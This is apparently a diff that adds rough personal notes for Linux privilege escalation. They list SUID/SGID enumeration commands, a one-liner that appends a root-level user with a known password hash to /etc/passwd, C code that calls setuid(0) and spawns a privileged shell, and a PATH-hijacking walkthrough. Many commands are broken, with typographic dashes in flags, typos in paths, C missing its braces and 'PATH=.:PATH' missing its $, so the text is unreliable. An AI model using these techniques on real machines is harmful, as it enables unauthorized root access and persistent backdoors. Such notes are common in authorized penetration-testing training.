@@ -1,0 +1,82 @@
+What files run as root / SUID / GUID?:
+
+find / -perm +2000 -user root -type f -print
+ find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
+ find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
+ find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
+ find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
+ for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done  
+ find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
+
+------------------------------------------------------------------------------------------------------------------------------
+
+What folders are world writeable?:
+
+find / -writable -type d 2>/dev/null
+find / -perm -o w -type d 2>/dev/null 
+find / -perm -222 -type d 2>/dev/null
+find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
+find / -perm -o x -type d 2>/dev/null 
+
+------------------------------------------------------------------------------------------------------------------------------
+
+	• echo 'toor:aaKNIEDOaueR6:0:0:toor:/root:/bin/bash' >> /etc/passwd
+	It will create a new root user with the password “foo”. The encrypted password was generated with: perl -le 'print crypt("foo", "aa")'. You can then easily elevate to a root shell with su toor
+
+
+	• find / -perm -4000 2>/dev/null 1 find / -perm -4000 2>/dev/null
+	• find / -perm -4000 2>/dev/null 
+	• Echo "sudo su" > monitor.sh
+	Chmod 777 * 
+	sudo ./monitor.sh
+	• https://gtfobins.github.io
+	• https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/
+https://recipeforroot.com/suid-binaries/
+
+
+------------------------------------------------------------------------------------------------------------------------------
+
+                                          SPAWN SHELL
+                                          #include <stdio.h>
+#include <stdlib.h>
+
+static void inject() __attribute__((constructor));
+void inject()
+	setuid(0);
+	system("/bin/bash -p");
+------------------------------------------------------------------------------------------------------------------------------
+
+	• File owner is root and root user can be –read –write –x(execute)
+	
+
+Services running as Root
+	• ps aux | grep "^root"
+		○ <program> --versions or <program> -v  
+	
+SUID SGID
+	• Root@kali:
+	find / -type f –a \( perm –u+s –o –perm –g+s \) -exec ls –l {} \; 2> /dev/null
+
+SUID
+	• Find |open|access|no such file strings in vulnerable binary file
+		○ Root@kali: strace /usr/local/bin/setuid-so 2>&1 | grep –iE "open|access|no such file"
+	
+	• PATH Veriable
+		○  find / -type f –a \( perm –u+s –o –perm –g+s \) -exec ls –l {} \; 2> /dev/null
+			▪ Output: /usr/loca/bin/suid-env
+				• strings /usr/local/bin/suid-ev
+				• OUTPUT: service apache2 start
+				• We can create C file and compile for SERVICE name
+					○ int main() {
+						setuid(0);
+						system("/bin/bash -p");
+					}
+				• And compile: gcc –o system test.c
+				• User@debian: PATH=.:PATH /usr/local/bin/suid-env
+				• Root@debian: 
+	
+  
+  ------------------------------------------------------------------------------------------------------------------------------
+    https://github.com/diego-treitos/linux-smart-enumeration
+    
+    root@kali: ./lse.sh -l 1
